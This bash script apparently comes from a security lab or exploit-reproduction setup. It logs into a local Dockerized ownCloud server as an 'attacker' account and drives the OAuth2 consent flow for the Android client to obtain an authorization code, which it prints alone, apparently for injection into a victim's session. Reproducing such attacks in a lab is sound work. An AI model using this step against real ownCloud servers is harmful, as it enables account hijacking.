#!/usr/bin/env bash
# Generates an OAuth authorization code for the attacker account.
# Outputs ONLY the authorization code (no other text).
set -euo pipefail

OC_BASE="${OC_BASE:-http://localhost:8080}"
ATTACKER_USER="${ATTACKER_USER:-attacker}"
ATTACKER_PASS="${ATTACKER_PASS:-S3cureAttacker!2026}"
CLIENT_ID="${CLIENT_ID:-e4rAsNUSIUs0lF4nbv9FmCeUkTlV9GdgTLDH1b5uie7syb90SzEVrbN7HIpmWJeD}"
REDIRECT_URI="${REDIRECT_URI:-oc://android.owncloud.com}"

fail(){ printf '%s\n' "$*" >&2; exit 1; }
command -v docker >/dev/null 2>&1 || fail "docker required"

code=$(docker exec -i \
  -e OC_BASE="$OC_BASE" \
  -e ATTACKER_USER="$ATTACKER_USER" \
  -e ATTACKER_PASS="$ATTACKER_PASS" \
  -e CLIENT_ID="$CLIENT_ID" \
  -e REDIRECT_URI="$REDIRECT_URI" \
  owncloud_server sh -s <<'EOS'
set -eu
JAR=$(mktemp)
trap "rm -f $JAR" EXIT

# Login to get session
reqtoken=$(curl --max-time 15 -skL -c "$JAR" "$OC_BASE/index.php/login" \
  | sed -n 's/.*name="requesttoken" value="\([^"]*\)".*/\1/p' | head -1)
[ -n "$reqtoken" ] || exit 1

curl --max-time 15 -sk -b "$JAR" -c "$JAR" \
  -d "user=$ATTACKER_USER" \
  -d "password=$ATTACKER_PASS" \
  -d "requesttoken=$reqtoken" \
  "$OC_BASE/index.php/login" >/dev/null

# Get authorization page token
auth_url="$OC_BASE/index.php/apps/oauth2/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&state=x"
auth_reqtoken=$(curl --max-time 15 -sk -b "$JAR" "$auth_url" \
  | sed -n 's/.*name="requesttoken" value="\([^"]*\)".*/\1/p' | head -1)
[ -n "$auth_reqtoken" ] || exit 1

# Submit consent, extract code from redirect
loc=$(curl --max-time 15 -sk -D - -o /dev/null -b "$JAR" \
  -d "requesttoken=$auth_reqtoken" \
  "$auth_url" \
  | awk '/^Location: /{print $2}' | tr -d '\r')
[ -n "$loc" ] || exit 1

printf '%s\n' "$loc" | sed -n 's/.*code=\([^&]*\).*/\1/p'
EOS
) || fail "failed to generate authorization code"

[ -n "$code" ] || fail "empty authorization code"
printf '%s\n' "$code"
